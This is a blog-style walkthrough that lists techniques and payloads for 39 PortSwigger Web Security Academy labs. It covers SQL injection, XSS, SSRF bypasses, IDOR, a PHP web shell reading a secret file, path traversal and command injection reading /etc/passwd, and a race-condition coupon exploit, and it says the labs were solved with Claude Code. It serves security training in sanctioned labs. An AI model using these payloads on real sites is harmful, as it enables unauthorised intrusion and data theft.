---
title: "PortSwigger Web Security Academy - 39 Labs Solved"
date: 2026-03-31
draft: false
author: "anir0y"
tags: ["web-security", "portswigger", "burp-suite", "labs", "practitioner"]
categories: ["security"]
description: "Complete walkthrough of 39 PortSwigger Web Security Academy labs covering SQLi, XSS, SSRF, API Testing, Race Conditions, and more."
---

# PortSwigger Web Security Academy — 39 Labs Solved

Completed 39 labs across 10 vulnerability categories on PortSwigger's Web Security Academy. Here is a technique summary organized by category.

---

## SQL Injection (14 labs)

| Lab | Technique |
|-----|-----------|
| WHERE clause hidden data | `' OR 1=1--` in category parameter |
| Login bypass | `administrator'--` as username |
| UNION column count | `ORDER BY` incrementing or `UNION SELECT NULL,NULL,...` |
| UNION find text column | `UNION SELECT 'test',NULL,...` per column |
| UNION retrieve data | `UNION SELECT username,password FROM users` |
| UNION multi-value single column | `UNION SELECT username||'~'||password FROM users` |
| Oracle DB version | `UNION SELECT banner,NULL FROM v$version` |
| MySQL/MSSQL version | `UNION SELECT @@version,NULL-- -` |
| List tables (non-Oracle) | `information_schema.tables` + `information_schema.columns` |
| List tables (Oracle) | `all_tables` + `all_tab_columns` |
| Blind conditional responses | Substring extraction via `TrackingId` cookie with `AND SUBSTRING(...)='a'` |
| Blind conditional errors | Oracle `CASE WHEN` with divide-by-zero triggering 500 |
| Blind time delays | PostgreSQL `pg_sleep(10)` triggered per character guess |
| Visible error-based | `CAST()` type conversion error leaks data in error message |

## API Testing (5 labs)

| Lab | Technique |
|-----|-----------|
| Exploiting documentation | Navigate to `/api` to find Swagger docs, `DELETE /api/user/carlos` |
| Unused endpoint | Change `GET /api/products/1/price` to `PATCH` with `{"price":0}` |
| Mass assignment | Add `"discount":100` to checkout JSON body |
| Server-side param pollution (query) | `%26field=reset_token` in username leaks admin reset token |
| Server-side param pollution (REST) | Double URL encoding (`%252e%252e%252f`) traverses API path to bypass v1 field restriction |

## Cross-Site Scripting (5 labs)

| Lab | Technique |
|-----|-----------|
| Reflected XSS (no encoding) | `<script>alert(1)</script>` in search param |
| Stored XSS (no encoding) | `<script>alert(1)</script>` in blog comment |
| DOM XSS document.write | `"><svg onload=alert(1)>` breaks out of img src |
| DOM XSS innerHTML | `<img src=1 onerror=alert(1)>` — innerHTML ignores script tags |
| DOM XSS jQuery href | `javascript:alert(document.cookie)` as returnPath param |

## Server-Side Request Forgery (4 labs)

| Lab | Technique |
|-----|-----------|
| Basic SSRF (local) | `stockApi=http://localhost/admin` |
| Basic SSRF (internal network) | Scan `192.168.0.X:8080` range via stockApi |
| Blacklist filter bypass | `127.1` + double-encoded `/admin` (`%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`) |
| Whitelist filter bypass | `http://localhost%2523@stock.weliketoshop.net/admin` — double-encoded `#` creates URL parsing confusion |

## Access Control (5 labs)

| Lab | Technique |
|-----|-----------|
| Unprotected admin panel | Direct access to `/administrator-panel` |
| Unpredictable admin URL | JavaScript source reveals `/admin-xxxxxx` path |
| Role via request param | Set `Admin=true` cookie |
| IDOR (user parameter) | Change `?id=wiener` to `?id=carlos` |
| IDOR (redirect leak) | Response body contains data even on 302 redirect |

## Authentication (2 labs)

| Lab | Technique |
|-----|-----------|
| Username enumeration | Different error messages for valid vs invalid usernames |
| 2FA simple bypass | Navigate directly to `/my-account` after first auth step |

## Race Conditions (1 lab)

| Lab | Technique |
|-----|-----------|
| Limit overrun | Send 40+ parallel HTTP/2 coupon requests using multiple warmed connections; applied PROMO20 coupon 19 times to reduce $1337 jacket to $19.25 |

## Other Categories

| Category | Lab | Technique |
|----------|-----|-----------|
| Path Traversal | Simple case | `../../../etc/passwd` in image filename param |
| File Upload | Web shell RCE | Upload `.php` file with `<?php echo file_get_contents('/home/carlos/secret');?>` |
| OS Command Injection | Simple case | `; cat /etc/passwd` in productId parameter |

---

## Key Takeaways

1. **Double URL encoding** bypasses both blacklist and whitelist SSRF filters
2. **Server-side parameter pollution** is a powerful technique — `%26` injects params, `%23` truncates them
3. **Race conditions** require multiple HTTP connections with warmed TCP handshakes for true simultaneous delivery
4. **innerHTML vs document.write** — different XSS payloads needed (no `<script>` tags in innerHTML)
5. **Blind SQL injection** techniques scale from conditional responses to time-based to error-based depending on what feedback the application provides

---

*Solved using Claude Code with Playwright MCP for browser automation and curl for HTTP-level exploitation.*
